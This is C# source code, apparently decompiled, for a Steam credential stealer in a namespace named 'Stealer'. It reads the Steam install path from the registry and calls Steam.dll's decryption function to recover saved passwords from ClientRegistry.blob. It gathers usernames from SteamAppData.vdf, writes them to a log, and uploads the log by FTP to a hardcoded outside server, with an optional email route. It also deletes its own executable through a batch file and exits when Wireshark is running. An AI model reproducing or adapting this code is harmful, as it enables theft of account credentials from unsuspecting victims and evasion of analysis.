using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stealer;

internal class Program
{
	public enum SteamErrorCode
	{
		None = 0,
		Unknown = 1,
		LibraryNotInitialized = 2,
		LibraryAlreadyInitialized = 3,
		Config = 4,
		ContentServerConnect = 5,
		BadHandle = 6,
		HandlesExhausted = 7,
		BadArg = 8,
		NotFound = 9,
		Read = 10,
		EOF = 11,
		Seek = 12,
		CannotWriteNonUserConfigFile = 13,
		CacheOpen = 14,
		CacheRead = 15,
		CacheCorrupted = 16,
		CacheWrite = 17,
		CacheSession = 18,
		CacheInternal = 19,
		CacheBadApp = 20,
		CacheVersion = 21,
		CacheBadFingerPrint = 22,
		NotFinishedProcessing = 23,
		NothingToDo = 24,
		CorruptEncryptedUserIDTicket = 25,
		SocketLibraryNotInitialized = 26,
		FailedToConnectToUserIDTicketValidationServer = 27,
		BadProtocolVersion = 28,
		ReplayedUserIDTicketFromClient = 29,
		ReceiveResultBufferTooSmall = 30,
		SendFailed = 31,
		ReceiveFailed = 32,
		ReplayedReplyFromUserIDTicketValidationServer = 33,
		BadSignatureFromUserIDTicketValidationServer = 34,
		ValidationStalledSoAborted = 35,
		InvalidUserIDTicket = 36,
		ClientLoginRateTooHigh = 37,
		ClientWasNeverValidated = 38,
		InternalSendBufferTooSmall = 39,
		InternalReceiveBufferTooSmall = 40,
		UserTicketExpired = 41,
		CDKeyAlreadyInUseOnAnotherClient = 42,
		NotLoggedIn = 101,
		AlreadyExists = 102,
		AlreadySubscribed = 103,
		NotSubscribed = 104,
		AccessDenied = 105,
		FailedToCreateCacheFile = 106,
		CallStalledSoAborted = 107,
		EngineNotRunning = 108,
		EngineConnectionLost = 109,
		LoginFailed = 110,
		AccountPending = 111,
		CacheWasMissingRetry = 112,
		LocalTimeIncorrect = 113,
		Network = 200
	}

	public delegate SteamErrorCode SteamDecryptDataForThisMachine([MarshalAs(UnmanagedType.LPStr)] string encryptedData, int encryptedDataSize, [MarshalAs(UnmanagedType.LPStr)] StringBuilder decryptedBuffer, int decryptedBufferSize, ref int decryptedDataSize);

	private static bool email = false;

	private static bool ftp = true;

	private static bool encryptFile = false;

	private static bool deleteExe = true;

	private static string passwoerter = "";

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	internal static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("kernel32", SetLastError = true)]
	internal static extern bool FreeLibrary(IntPtr hModule);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

	public static bool CheckProcessIsRun(string sProcessName)
	{
		return Process.GetProcessesByName(sProcessName).Length > 0;
	}

	public static string EncryptLog(string text)
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < 12; i++)
		{
			stringBuilder.Append(Convert.ToChar(Convert.ToInt32(Math.Floor(30.0 * random.NextDouble() + 65.0))));
		}
		string str = encrypt(text);
		Thread.Sleep(300);
		string text2 = Encode(str);
		return text2 += stringBuilder;
	}

	public static string Encode(string str)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(str);
		return Convert.ToBase64String(bytes);
	}

	public static string encrypt(string password)
	{
		password = password.Replace("a", "¡");
		password = password.Replace("b", "¢");
		password = password.Replace("c", "£");
		password = password.Replace("d", "¤");
		password = password.Replace("e", "¦");
		password = password.Replace("f", "§");
		password = password.Replace("g", "\u00a8");
		password = password.Replace("h", "©");
		password = password.Replace("i", "ª");
		password = password.Replace("j", "«");
		password = password.Replace("k", "¬");
		password = password.Replace("l", "®");
		password = password.Replace("m", "\u00af");
		password = password.Replace("n", "°");
		password = password.Replace("o", "±");
		password = password.Replace("p", "²");
		password = password.Replace("q", "³");
		password = password.Replace("r", "\u00b4");
		password = password.Replace("s", "µ");
		password = password.Replace("t", "¶");
		password = password.Replace("u", "·");
		password = password.Replace("v", "\u00b8");
		password = password.Replace("w", "¹");
		password = password.Replace("x", "º");
		password = password.Replace("y", "»");
		password = password.Replace("z", "¼");
		password = password.Replace(" ", "Î");
		password = password.Replace("\n", "⁅");
		password = password.Replace("=", "^");
		return password;
	}

	private static void Main(string[] args)
	{
		if (deleteExe)
		{
			string value = ":Repeat\n del " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\n if exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat \n rmdir " + Environment.SystemDirectory + '"' + "\ndel del.bat";
			TextWriter textWriter = new StreamWriter(Environment.SystemDirectory + "\\del.bat");
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			try
			{
				process.StartInfo.FileName = Environment.SystemDirectory + "\\del.bat";
				process.StartInfo.UseShellExecute = true;
				process.Start();
			}
			catch (Exception)
			{
				throw;
			}
		}
		string sProcessName = "wireshark";
		if (CheckProcessIsRun(sProcessName))
		{
			return;
		}
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("Software\\Valve\\Steam");
			object value2 = currentUser.GetValue("SteamPath");
			string text = value2.ToString()!.Replace("/", "\\");
			IntPtr hModule = LoadLibrary(text + "\\Steam.dll");
			IntPtr procAddress = GetProcAddress(hModule, "SteamDecryptDataForThisMachine");
			string text2 = "";
			string text3 = "";
			try
			{
				StreamReader streamReader = new StreamReader(text + "\\config\\SteamAppData.vdf");
				while ((text2 = streamReader.ReadLine()) != null)
				{
					if (text2.Contains("User"))
					{
						text3 = text3 + text2 + "\n";
					}
				}
				streamReader.Close();
			}
			catch
			{
			}
			Console.WriteLine(text3);
			string text4 = File.ReadAllText(text + "\\ClientRegistry.blob");
			bool flag = true;
			File.ReadAllText(text + "\\config\\SteamAppData.vdf");
			int num = 0;
			try
			{
				while (num < text4.Length && flag)
				{
					string text5 = text4.Substring(text4.IndexOf("Phrase", num) + 40, 92);
					int decryptedDataSize = 0;
					StringBuilder stringBuilder = new StringBuilder(text5.Length / 2);
					if (procAddress != IntPtr.Zero)
					{
						SteamDecryptDataForThisMachine steamDecryptDataForThisMachine = (SteamDecryptDataForThisMachine)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(SteamDecryptDataForThisMachine));
						try
						{
							steamDecryptDataForThisMachine(text5, text5.Length, stringBuilder, stringBuilder.Capacity, ref decryptedDataSize);
						}
						catch (Exception ex2)
						{
							Console.WriteLine(ex2.Message);
						}
					}
					stringBuilder.Length = decryptedDataSize;
					num = text4.IndexOf("Phrase", text4.IndexOf("Phrase", num)) + 132;
					passwoerter = passwoerter + stringBuilder.ToString() + "\n";
					Console.WriteLine(passwoerter);
				}
			}
			catch (ArgumentOutOfRangeException ex3)
			{
				Console.WriteLine(ex3.Message);
			}
			string text6 = "Possible Usernames: \n--------------------------------------\n\n" + text3 + "\n=========================================================\nGespeicherte Passwoerter:\n" + passwoerter + "\n=========================================================\n";
			StreamWriter streamWriter = new StreamWriter(Environment.SystemDirectory + "\\" + Environment.MachineName + ".log");
			if (encryptFile)
			{
				streamWriter.Write(EncryptLog(text6));
			}
			if (!encryptFile)
			{
				streamWriter.Write(text6);
			}
			streamWriter.Close();
			if (ftp)
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://ftp.gundel123.gu.ohost.de//" + Environment.MachineName + ".log");
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential("gundel123_01", "patrickgundelach");
				StreamReader streamReader2 = new StreamReader(Environment.SystemDirectory + "\\" + Environment.MachineName + ".log");
				byte[] bytes = Encoding.UTF8.GetBytes(streamReader2.ReadToEnd());
				streamReader2.Close();
				new FileInfo(Environment.SystemDirectory + "\\" + Environment.MachineName + ".log");
				ftpWebRequest.ContentLength = bytes.Length;
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
				Console.WriteLine("Upload File Complete, status {0}", ftpWebResponse.StatusDescription);
				ftpWebResponse.Close();
			}
			if (email)
			{
				string body = File.ReadAllText(Environment.SystemDirectory + "\\" + Environment.MachineName + ".log");
				MailMessage mailMessage = new MailMessage();
				mailMessage.To.Add("");
				mailMessage.Subject = Environment.MachineName + " Vic-Log";
				mailMessage.Body = body;
				mailMessage.From = new MailAddress("");
				SmtpClient smtpClient = new SmtpClient("");
				smtpClient.Send(mailMessage);
			}
			FreeLibrary(hModule);
		}
		catch (Exception)
		{
		}
	}
}
